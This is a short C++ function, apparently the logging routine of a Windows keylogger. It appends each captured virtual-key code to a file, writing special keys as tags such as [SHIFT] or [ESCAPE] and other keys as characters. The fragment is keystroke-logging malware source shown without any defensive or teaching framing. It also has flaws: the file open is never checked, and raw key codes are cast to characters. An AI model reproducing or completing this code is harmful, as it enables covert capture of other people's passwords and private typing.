int Save(int key_stroke, const char *file) {
    if ((key_stroke == 1) || (key_stroke == 2))
        return 0;

    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");

    char key = static_cast<char>(key_stroke); // Convert key code to character

    if (key_stroke == VK_SPACE)
        fprintf(OUTPUT_FILE, " ");
    else if (key_stroke == VK_RETURN)
        fprintf(OUTPUT_FILE, "\n");
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "\t");
    else if (key_stroke == VK_SHIFT || key_stroke == VK_LSHIFT || key_stroke == VK_RSHIFT)
        fprintf(OUTPUT_FILE, "[SHIFT]");
    else if (key_stroke == VK_CONTROL || key_stroke == VK_LCONTROL || key_stroke == VK_RCONTROL)
        fprintf(OUTPUT_FILE, "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "[ESCAPE]");
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "[END]");
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "[HOME]");
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "[LEFT]");
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "[UP]");
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "[RIGHT]");
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "[DOWN]");
    else if (key_stroke == VK_OEM_PERIOD || key_stroke == VK_DECIMAL)
        fprintf(OUTPUT_FILE, ".");
    else
        fprintf(OUTPUT_FILE, "%c", key); // Save the character

    fclose(OUTPUT_FILE);
    return 0;
}
